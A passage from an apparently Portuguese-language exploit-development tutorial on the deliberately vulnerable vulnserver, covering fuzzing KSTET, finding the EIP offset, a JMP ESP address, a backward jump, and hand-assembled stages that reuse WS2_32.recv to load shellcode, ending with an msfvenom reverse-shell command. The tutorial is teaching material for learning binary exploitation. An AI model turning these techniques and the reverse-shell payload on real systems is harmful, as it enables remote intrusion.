Variable 0:1 Variablesize= 5004 Fuzzing Variable 0:2 Variablesize= 5005 Fuzzing Variable 0:3 Variablesize= 21 ^C [/sourcecode] Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug. [sourcecode language=&quot;shell&quot;]Fuzzing Variable 0:1 Variablesize= 5004 [/sourcecode] Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger: Pode-se observar que o spike enviou a requisição conforme abaixo: [sourcecode language=&quot;shell&quot;]KSTET /.:/AAAAAAAAA........ [/sourcecode] Provavelmente 5000 A com o prefixo /.:/ Vamos duplicar este exploit em python criando então uma prova de conceito (PoC) &nbsp; 0x02 - Exploit de PoC Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres /.:/ então vamos reproduzir isso: Executando nosso PoC temos a seguinte saída: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# ./02-poc.py [*] Enviando requisicao maliciosa ... [/sourcecode] E o crash ocorreu: Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre. 0x03 - Determinando o tipo de Exploit e o Offset de controle Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por: [sourcecode language=&quot;shell&quot;]41414141 [/sourcecode] Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como vanilla EIP overwrite. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da metasploit para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu. Gerando o buffer único: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_create -l 5000 [/sourcecode] Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo: Execute este script e veja como ficou o registrador EIP: Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_offset -l 5000 -q 41326341 [*] Exact match at offset 66 [/sourcecode] Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto. 0x04 - Verificando o Offset Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo: E executamos ele obtendo o resultado abaixo: Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs. Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes: Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos. Nota importante: Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros. 0x05 - Saltando para nosso Buffer O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte. [sourcecode language=&quot;shell&quot;]!mona jmp -n -r ESP [/sourcecode] Este comando nos retornou 9 opções Porém a nossa escolha foi a primeira: [sourcecode language=&quot;shell&quot;]Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) [/sourcecode] Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - &#39;\\r&#39;, 0x0a - &#39;\\n&#39;). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional. Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian. Segue nosso exploit atualizado: Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão Goto address in Dissassembler demonstrado abaixo: E digite o endereço da instrução JMP ESP escolhida: Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint. Agora execute o exploit e veja a aplicação parando no breakpoint selecionado Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status &quot;Breakpoint at essfunc.625011AF&quot; e não outro erro como access violation. Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs 0x06 - Saltando para o buffer maior Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes) Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos. Olhando na imagem anterior vemos o seguinte cenário: [sourcecode language=&quot;shell&quot;]00EDF9F8 43 INC EBX [/sourcecode] Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As? [sourcecode language=&quot;shell&quot;]00EDF9B2 41 INC ECX [/sourcecode] Então podemos fazer alguns cálculos para realizar a movimentação necessária [sourcecode language=&quot;shell&quot;]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70 [/sourcecode] Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX: [sourcecode language=&quot;shell&quot;]PUSH ESP POP EDX [/sourcecode] E posteriormente subtrair 0x46 (decimal 70) de seu valor: [sourcecode language=&quot;shell&quot;]SUB EDX,0x46 [/sourcecode] E por fim saltar para o endereço desejado: [sourcecode language=&quot;shell&quot;]JMP EDX [/sourcecode] Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada msf-nasm_shell conforme demonstrado abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;amp;amp;gt; PUSH ESP 00000000 54 push esp nasm &amp;amp;amp;amp;gt; SUB EDX,0x46 00000000 83EA46 sub edx,byte +0x46 nasm &amp;amp;amp;amp;gt; JMP EDX 00000000 FFE2 jmp edx nasm &amp;amp;amp;amp;gt; [/sourcecode] Segue abaixo o exploit atualizado: Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP) [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;amp;amp;gt; JMP short -72 00000000 EBB6 jmp short 0xffffffb8 nasm &amp;amp;amp;amp;gt; [/sourcecode] Segue abaixo a segunda opção: Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção. Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo: Neste ponto temos pelo menos 2 formar de continuar com o exploit: Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter (este processo é descrito no post Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter ) Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Isso parece meio confuso no início, mas não se preocupe mais a frente explicarei mais detalhadamente este processo. Neste post abordaremos a opção 2: reutilização da função WS2_32.recv. 0x07 - Entendendo a engenharia e utilização da função WS2_32.recv Não existe outra forma melhor de entender o funcionamento deste processo sem entender o que a nossa aplicação está executando, então vamos ao código da aplicação: Analisando o fluxo da aplicação percebemos que a mesma abre um socket na porta especificada, e quando um cliente se conecta é criada uma nova thread que executa a função ConnectionHandler (aproximadamente linha 160) esta é a função responsável por tratar da conexão do cliente. Indo mais a fundo dentro dessa função, depois da conexão estabelecida a aplicação entre em um loop para tratar as requisições vindas do cliente e dentro do loop chama a função recv que é responsável por receber s dados vindos do nosso cliente através do socket. Bom, como a função WS2_32.recv funciona? Se olharmos na documentação do MSDN (localizada aqui) podemos ver o seguinte: [sourcecode language=&quot;c&quot;]int recv( SOCKET s, char *buf, int len, int flags ); [/sourcecode] Sendo assim a função recv recebe 4 parâmetros sendo eles: SOCKET s: file descriptor do socket da conexão do cliente; char *buf: ponteiro de memória do buffer para o qual os dados serão recebidos e copiados; int len: tamanho dos dados a serem recebidos do socket; int flags: as flags influenciam no comportamento da função, para nosso estudo podemos ignorar estes parâmetro. Continuando na análise do nosso código vemos que a função WS2_32.recv (em nosso código) é chamada conforme abaixo: [sourcecode language=&quot;c&quot;]Result = recv(Client, RecvBuf, RecvBufLen, 0); [/sourcecode] O que vamos colocar como foco é o parâmetro RecvBufLen que um pouco antes é definido como: [sourcecode language=&quot;c&quot;]int RecvBufLen = DEFAULT_BUFLEN; [/sourcecode] Que por sua vez a variável estática DEFAULT_BUFLEN fou definida anteriormente como: [sourcecode language=&quot;c&quot;]#define DEFAULT_BUFLEN 4096 [/sourcecode] Isso indica que nossa aplicação realiza a leitura de 4096 bytes. Afe!!!, não entendi nada mas nosso overflow não está ocorrendo com 66 bytes? Da onde vem esse 4096? Vamos continuar a análise que espero explicar isso. Extraindo a sessão de código que trata do nosso comando vulnerável KSTET temos o seguinte código: [sourcecode language=&quot;c&quot;]} else if (strncmp(RecvBuf, &quot;KSTET &quot;, 6) == 0) { char *KstetBuf = malloc(100); strncpy(KstetBuf, RecvBuf, 100); memset(RecvBuf, 0, DEFAULT_BUFLEN); Function2(KstetBuf); SendResult = send( Client, &quot;KSTET SUCCESSFUL\\n&quot;, 17, 0 ); } [/sourcecode] Vamos estudar linha a linha: char *KstetBuf = malloc(100): cria a variável KstetBuf e aloca uma espaço de memória de 100 bytes para ela; strncpy(KstetBuf, RecvBuf, 100): copia os 100 primeiros bytes do buffer recebido pelo socket para essa variável recem criada KstetBuf ; memset(RecvBuf, 0, DEFAULT_BUFLEN): preenche todo o buffer (variável RecvBuf) com zeros; Function2(KstetBuf): chama a função Function2 passando como parâmetro a variável KstetBuf que por sua vez detem 100 bytes; Até ai tudo OK, sem nenhuma vulnerabilidade e nhum problema, agora vamos analisar o código da função chamada Function2 conforme abaixo: [sourcecode language=&quot;c&quot;]void Function2(char *Input) { char Buffer2S[60]; strcpy(Buffer2S, Input); } [/sourcecode] Mais uma vez vamos a análise linha a linha: char Buffer2S[60]: cria uma variável com tamanho fixo de 60 bytes; strcpy(Buffer2S, Input): realiza a copia do parâmetro recebido, de nome Input. Nesta sessão podemos perceber a vulnerabilidade no strcpy onde se tenta copiar os 100 bytes passados como parâmetro para dentro de um buffer de 60 bytes. Sendo assim novo overflow consiste em controlar o fluxo da aplicação que ao invés dela continuar seu fluxo normal e executar o código SendResult = send( Client, &quot;KSTET SUCCESSFUL\\n&quot;, 17, 0 ) a mesma vai saltar para o endereço que desejamos e controlamos no EIP. Isso explica algumas coisas, o buffer de 66 bytes, pois nunca é o tamanho exato do tamanho da variável que houve o overflow (caso tenha duvida ou não esteja muito familiarizado com este processo sugiro a leitura do post que fiz explicando a teoria do buffer overflow Criação de Exploits – Parte 0 – Um pouco de teoria). Explica também porque temos um buffer tão limitado de 20 bytes após o EIP. Até agora entendemos o porque o overflow ocorre, o porque temos um tamanho tão limitado após o EIP, mas ainda não entramos no como utilizaremos a função recv a nosso favor para receber o nosso shellcode. Como vimos a aplicação em seu fluxo normal executa as seuintes operações: Realiza o bind na porta desejada (por padrão 9999); Quando o cliente se conecta chama a função ConnectionHandler em uma nova thread para tratar das requisições do cliente; Dentro da função ConnectionHandler, fica em um loop infinito chamando a função WS2_32.recv para receber os dados do cliente e trata os dados recebidos conforme os IFs; Em nosso comando vulnerável (KSTET) chama a função de nome Function2; Depois retorna dados para o cliente; O que pretendemos fazer é alterar este fluxo que depois do nosso crash possamos chamar de forma deliberada a função recv lendo um novo buffer de nosso cliente, só que dessa vez sem os limitadores impostos pela aplicação, pois nós que definiremos o tamanho do buffer, e mandando que o recv escreva os novos dados recebidos (que será nosso shellcode) em uma área estratégica para que possamos executa-lo. Basicamente temos a seguinte anatomia após o nosso overflow: 66 bytes: que será nosso segundo estágio 4 bytes: endereço do EIP 20 bytes: stagio1 que fará o JUMP para o segundo estágio Dentro do segundo estágio (66 bytes) nos vamos chamar a função WS2_32.recv para que ela leia do nosso socket mais 520 bytes e o grave no endereço de memória antes do final dos 66 bytes para que após a leitura destes dados possamos executar o nosso shellcode. Vamos dar uma olhada na imagem abaixo logo antes da chamada da função recv Note que a proxima instrução a ser executada é a CALL EAX e que EAX detém o endereço de memória da função WS2_32.recv, e na pilha para a chamada da função tem-se 4 parâmetros conforme abaixo: Socket = 0x50: Nosso file descripto do socket do cliente; Buffer = 0x00E2F9F0: Endereço de memória onde será gravado os dados recebidos pelo socket; BufSize = 0x0208 (Decimal 520): Tamanho do buffer que deve ser lido; Flags = 0: Podemos ignorar. Sendo assim observe que coloquei estratégicamente o endereço onde será gravado os novos dados recebidos para logo depois da minha posição atual de execução, sendo assim após a chamada da função WS2_32.recv continua-se a execução até chegar no shellcode. Agora observer abaixo logo após a chamada da função recv, para efeitos didáticos o shellcode que passei são 520 E que tem hexa 0x45 Do ponto de vista do meu código foi chamado da seguinte forma: [sourcecode language=&quot;python&quot;]#!/usr/bin/python # -*- coding: utf-8 -*- ... ... ... exp.send(buffer) sleep(1) shellcode = &quot;E&quot; * 520 exp.send(shellcode) [/sourcecode] Onde a variável buffer detém todo o código para fazer o buffer overflow e a chamada da função recv (veremos esse código mais a frente) e a variável shellcode são 520 Es &nbsp; 0x08 - Encontrando a função WS2_32.recv Agora que sabemos que iremos usar a função WS2_32.recv precisamos encontra-la em nosso código, o que sabemos é que ela ja foi usada em nossa aplicação, sendo assim ela estará em nossa IAT (Import Address Table) e em algum lugar da nossa aplicação. Para localiza-la reinicie o Immunity Debbuger, anexe a aplicação e no painel superior esquerdo clique com o botão direito do mouse e clique em View &gt; Module &#39;vulnserv&#39;, caso a opção Module &#39;vulnserv&#39; não apareça é porque você ja está neste módulo, se isso for verdade na barra de titulo você verá algo como &#39;module vulnserv&#39;. Agora no painel superior esquerdo clique com o botão direito do mouse e clique em Search for &gt; All intermodular calls Este processo nos mostrara a lista de todas as chamadas para outros módulos. Vamos clicar no cabeçalho na coluna &#39;Destination&#39; para ordenar por nome. É importante notar que a ordenação ocorrerá por nome da função não por módulo. Por exemplo, WS2_32.bind e WS2_32.recv serão ordenadas nas palavras bind e recv respectivamente. Após a ordenação podemos facilmente localizar a chamada para a recv, após localizado a selecione e pressione F2 para adicionar um breakpoint. Você verá que a instrução ficará marcada conforme a a imagem abaixo: Após adicionar o breakkpoint clique com o botão direito e clique em Follow in Disassembler Indo para a chamada da função WS2_32.recv Para localizar o nosso file descritor do socket, vamos alterar nosso exploit substituindo os As do nosso buffer por 0xCC que é um breakpoint. Isso é ara simplificar nosso processo. Quando executado o processo deverá parar no breakpoint do recv Neste ponto podemos observar nossa pilha (stack) os argumentos que estão sendo passados para a função recv. Que fazendo um paralelo com a documentação do MSDN temos os seguintes parâmetros: [sourcecode language=&quot;python&quot;]int recv( SOCKET 0x00000050, char *0x002B3358, int 0x1000, int 0x00000000 ); [/sourcecode] Então nosso file descriptor que tanto desejamos é 0x00000050. Vamos permitir a execução da nossa aplicação pressionando F9 (pode ser que precise reiniciar a aplicação e o immunity e retirar o breakpoint da função recv pois algumas vezes o sistema não permite dar continuidade na execução, se isso ocorrer reinicie o immunity e anexe novamente a aplicação e rode o exploit novamente). Nota de endereço: Neste ponto de pressionarmos mais uma vez o F7 iremos para a tela abaixo onde será apresentado o endereço da chamada da WS2_32.recv em nossa IAT (Import Address Table), anote este endereço pois utilizaremos bem mais a frente. 0x09 - Encontrando o file descriptor Uma vez encontrado o valor do file descriptor agora precisamos encontrar onde o valor do mesmo está armazenado e qual a relação e distância na pilha ele está da nossa posição atual. Com nosso exploit parado no primeiro 0xCC no painel esquero superior clique com o botão direito do mouse e clique em Search for &gt; Binary String Então procure pelo valor do file descriptor (em nosso caso 0x00000050) Quando fazemos isso, podemos buscar as outras opções pressionando CTRL + L. No nosso ambiente encontramos as seguintes opções Escolhi a primeira opção [sourcecode language=&quot;c&quot;]00FAF8B1 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8B3 0050 00 ADD BYTE PTR DS:[EAX],DL 00FAF8B6 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8B8 0000 ADD BYTE PTR DS:[EAX],AL 00FAF8BA 0000 ADD BYTE PTR DS:[EAX],AL [/sourcecode] Quando nós alcançamos a função recv pela primeira vez a pilha de memória estava na posição [sourcecode language=&quot;c&quot;]00FAF9F8 [/sourcecode] Baseado nessas informações podemos calcular a distancia entre a posição atual da pilha e o endereço atual [sourcecode language=&quot;c&quot;]0x00F7F9F8 (Endereço desejado) - 0x00F7F8B1 (ESP) = Hex: 0x0147 ou Decimal: 327 [/sourcecode] Sendo assim vamos começar a escrita do nosso segundo estágio do exploit [sourcecode language=&quot;c&quot;]PUSH ESP ; Armazena a posição atual de ESP na pilha POP ECX ; Retira o valor da pilha e o coloca em ECX SUB CX,0x147 ; Subtrai 0x147 de ECX [/sourcecode] Usando o msf-nasm_shell para nos ajudar nessa tarefa [sourcecode language=&quot;c&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;amp;gt; push esp 00000000 54 push esp nasm &amp;amp;gt; pop ecx 00000000 59 pop ecx nasm &amp;amp;gt; sub cx,0x147 00000000 6681E94701 sub cx,0x147 nasm &amp;amp;gt; [/sourcecode] O exploit ficou assim: Ao executa-lo temos o ECX apontando exatamente para a posição de memória que contém o endereço do file descriptor: Em um mundo perfeito isso estaria certo, mas como logo a frente iremos resgatar este valor usando a chamada PUSH DWORD PTR DS:[ECX], vamos executa-la agora apenas para ver o que acontece. Podemos ver que o valor inserido na pilha foi 0x50000000 e não 0x00000050 como o esperado, isso ocorre devido ao endianess, sendo assim precisamos alterar nosso exploit para subtrair 3 bytes a menos sendo 0x144 ao invés de 0x147, ficando assim: 0x0a - Chamando WS2_32.recv Com nosso file descriptor podemos calcular/montar os outros 3 parametros necessários para a chamada da função WS2_32.recv. Retomando como deve ser a chamada da função, como visto anteriormente, os valores devem ser similares a estes (segund p padrão da documentação do MSDN): [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x002B3358, int 0x1000, int 0x00000000 ); [/sourcecode] Conforme visto e certificado na imagem abaixo: Como colocaremos os valores diretamente na pilha devemos lembrar que o empilhamento deve ocorrer de forma inversa (caso tenha dúvidas deste funcionamento veja nosso post Criação de Exploits – Parte 0 – Um pouco de teoria onde explico o funcionamento da pilha e outas coisas mais), sendo assim o primeiro item a ser empilhado é o quarto parâmetro (flags), para posteriormente o tamanho do buffer, a localização da memória a ser utilizada como buffer e por fim o file descriptor (valor este qe ja temos armazenado em ECX) Outro ponto importante que devemos observar é que conforme realizamos um empilhamento, ou seja PUSH, o endereço da pilha vai subtraindo e conforme observado na imagem abaixo o endereço da nossa pilha está localizado ligeiramente abaixo do nosso buffer, isso faz com que cada valor que vamos colocar na pilha reduz mais o nosso restruto espaço de 66 bytes, sendo assim nossa primeira preoocupação antes de colocar os valores na pilha é alterar a posição da pilha para contornar este problema. Então nada que jogar a pilha para 80 bytes a menos não resolva [sourcecode language=&quot;c&quot;]SUB ESP, 0X50 [/sourcecode] Vamos agora tratar o primeiro parametro a ser empilhado (4 argumento da função recv) que é a flag que necessita ter valor 0x00 como 0x00 é um null byte e não podemos usar em nosso exploit vamos usar a técnica do XOR: [sourcecode language=&quot;c&quot;]XOR EAX,EAX ; Zera eax PUSH EAX ; Coloca EAX na pilha [/sourcecode] O segundo valor a ser empilhado (3 argumento da função recv) é o tamanho do buffer, que em nosso caso escolhi 520 (hexa 0x0208) em virtude de uma questão estratégica de não usar o null byte neste processo. Nesta atribuição iremos usar alguns recursos do assembly que nos permite atribuir diretamente algumas partes do nosso registrador, para facilitar o entendimento de uma olhada na imagem abaixo: Representado com os valores que desejamos abaixo: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 00 00 02 08 | +--------|-------------+ | | AX | |16 bits | 02 08 | +--------|-------------+ | | AH AL | |8 bits | 02 08 | +----------------------+ [/sourcecode] Sendo assim podemos atribuir da seguinte forma: [sourcecode language=&quot;c&quot;]XOR EAX,EAX ; Zera eax MOV AL,0x08 ; Coloca 0x08 em AL MOV AH,0x02 ; Coloca 0x02 em AH PUSH EAX ; Coloca EAX na pilha [/sourcecode] Agora vamos para o terceiro valor a ser empilhado (segundo parâmetro da função recv) que é o endereço de memória onde deve-se gravar o que for recebido pelo socket do cliente. Como sabemos que nosso ESP foi deslocado 80 bytes e que antes do deslocamento ele estava ligeiramente abaixo do nosso restrito espaço de 66 bytes vamos usar o mesmo parâmetro de calculo para estimar a posição onde deve ser gravado os dados lidos pelo socket: [sourcecode language=&quot;c&quot;]PUSH ESP ; Armazena a posição atual de ESP na pilha POP EDX ; Retira o valor da pilha e o coloca em EDX ADD EDX, 50 ; Adiciona 80 bytes (hexa 0x50) ao registrador EDX PUSH EDX ; Coloca EDX na pilha [/sourcecode] Por fim vamos colocar na pilha o valor do nosso file descriptor (enteriormente calculado) [sourcecode language=&quot;c&quot;]PUSH DWORD PTR DS:[ECX] ; Coloca na pilha o valor que existe no endereço de memória do ECX [/sourcecode] No final deste processo temos o código abaixo: E ao executa-lo o seguinte resultado: Fazendo nosso paralelo com a documentação MSDN temos os valores abaixo, lembrando que o endereço de memória é dinâmico, então se altera a cada execução [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x00FEF9F0, int 0x00000208, int 0x00000000 ); [/sourcecode] Agora temos todos os parâmetros necessários para chamar a função WS2_32.recv, existem diversos métodos para chamar a função, utilizaremos um deles e ao meu ver o mais seguro deles. Mas antes disso precisamos saber qual é o endereço, creio que você se lembre daquele endereço que colocamos o breakpoint e eu falei p/ anotar que usariamos mais a frente? Não? Nessas alturas do campeonato, com tanta coisa eu também não lembraria, nós falamos dele no ítem 0x08, mas para facilitar o trabalho segue ele abaixo: [sourcecode language=&quot;c&quot;]0x0040252c [/sourcecode] Para coloca-lo na pilha vamos adiciona-lo em EAX e depois fazer um CALL EAX, mas ai temos um desafio, o endereço começa com ox00 que é um null byte, então o que fazemos? Sempre temos alguma carta na manga. Neste caso vamos colocar o valor deslocado 8 bits para a esquerda, e depois fazer o deslocamente para a direita. Simples né? Não, então vamos entender, supondo que tenhamos o valor abaixo: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 40 25 2c 11 | +--------|-------------+ [/sourcecode] Ao realizar o deslocamento dele 8 bits para a direita ele passará a ter o seguinte valor: [sourcecode language=&quot;c&quot;]+----------------------+ | | EAX | |32 bits | 00 40 25 2c | +--------|-------------+ [/sourcecode] Que é exatamente o que queremos, e para fazer isso em asembly usamos a instrução shr ficando assim: [sourcecode language=&quot;c&quot;]MOV EAX,0x40252c11 ; Atribui o valor 0x40252c11 em EAX SHR EAX,BYTE 0x8 ; Faz o deslocamento de 8 bits para a direita [/sourcecode] E por fim fazemos o call de EAX [sourcecode language=&quot;c&quot;]CALL EAX [/sourcecode] Antes de executar nosso exploit para o teste necessitamos criar 520 bytes para ser o shellcode bem como fazer o envio dele pelo socket ficando então nosso código como o abaixo: Ao executa-lo temos o seguinte cenário: Antes da chamada do CALL EAX Mais uma vez fazendo o paralelo com a documentação do MSDN temos os seguintes valores: [sourcecode language=&quot;c&quot;]int recv( SOCKET 0x00000050, char *0x00FEF9F0, int 0x00000208, int 0x00000000 ); [/sourcecode] Note que o endereço de memória 00FEF9F0 tem alguns NOPs seguido de outros códigos que logo depois da chamada do CALL EAX são inteiramente substituidos pelo nosso pseudo shellcode (0x45) &nbsp; 0x0b - Aproveite o shell Com tudo pronto basta alterar a variável do shellcode dentro do nosso exploit pelos shellcode desejado e seja feliz [sourcecode language=&quot;shell&quot;]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -b &quot;\\x00&quot; -f python [/sourcecode]","headline":"Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/"},"url":"https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/"}</script><title>Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv | Helvio Junior</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Helvio Junior"><meta name="application-name" content="Helvio Junior"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/m4v3r1ck.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Helvio Junior</a></div><div class="site-subtitle font-italic">Cyber security researcher, speaker, low level and binary exploitation entusiast. <br /><br />"I’m just a child who has never grown up. I still keep asking these 'how' & 'why' questions. Occasionally, I find an answer. Stephen Hawking"</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> 